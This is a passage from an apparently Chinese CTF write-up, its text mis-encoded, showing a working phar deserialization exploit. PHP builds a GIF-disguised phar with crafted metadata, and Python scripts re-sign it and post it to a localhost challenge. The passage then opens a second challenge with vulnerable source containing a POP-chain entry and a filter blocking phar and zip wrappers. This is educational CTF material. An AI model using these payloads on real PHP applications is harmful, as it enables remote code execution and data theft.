&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†.metadata.binä¸­å‰é¢çš„ä¸€ä¸ªi:1æ”¹ä¸ºi:0åæ”¹ç­¾å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">hashlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sha1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">28&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># è¯»å–å¼€å§‹åˆ°æœ«å°¾é™¤ç­¾åå¤–å†…å®¹&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">last&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">:]&lt;/span> &lt;span style="color:#75715e"># è¯»å–æœ€å8ä½çš„GBMBå’Œç­¾åflag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digest&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">last&lt;/span> &lt;span style="color:#75715e"># ç”Ÿæˆæ–°çš„æ–‡ä»¶å†…å®¹ æ­¤æ—¶sha1æ­£ç¡®&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;change.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;wb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">new_file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>pythonå‘åŒ…ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">gzip&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost/temp/tttt.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./chang.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">#æ‰“å¼€æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gzip&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./ars2.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;wb+&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#75715e">#åˆ›å»ºå‹ç¼©æ–‡ä»¶å¯¹è±¡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writelines&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;O:1:&amp;#34;A&amp;#34;:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;w&amp;#34;;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./ars2.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># å†™å…¥&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;O:1:&amp;#34;A&amp;#34;:1:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;r&amp;#34;;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;phar://tmp/a.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># è§¦å‘&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220327000823801.png" alt="image-20220327000823801">&lt;/p>
&lt;p>å¾—åˆ°flag&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">æµ…æGCå›æ”¶æœºåˆ¶ä¸pharååºåˆ—åŒ–&lt;/a>&lt;/p>
&lt;h3 id="gfctf-2021æ–‡ä»¶æŸ¥çœ‹å™¨">[GFCTF 2021]æ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h3>
&lt;p>User.class.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// new Myerror();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// [new User(), &amp;#34;check&amp;#34;];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;view/login.html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location:./?c=Files&amp;amp;m=read&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">çš„å¯†ç ä¸æ­£ç¡®æˆ–ä¸å­˜åœ¨è¯¥ç”¨æˆ·&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// Myerror::__toString
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)();&lt;/span> &lt;span style="color:#75715e">// popå…¥å£ å¯ä»¥é€šè¿‡æ•°ç»„å½¢å¼è®¿é—®ä»»æ„ç±»çš„ä»»æ„æ–¹æ³• User::check
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$arg&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// ä¸å­˜åœ¨æ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Files.class.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;view/file.html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span> &lt;span style="color:#75715e">// ä¼ å…¥æ–‡ä»¶å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;è¯·è¾“å…¥æ–‡ä»¶å&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">getFile&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;br&amp;gt;&amp;lt;textarea class=&amp;#34;file_content&amp;#34; type=&amp;#34;text&amp;#34; value=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$contents&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">)){&lt;/span> &lt;span style="color:#75715e">// pharæ— ç–‘ è™½ç„¶è¢«banäº† åŠ filterç»•è¿‡(utf-16æç¤º
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;è¿™ä¸åˆç†&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
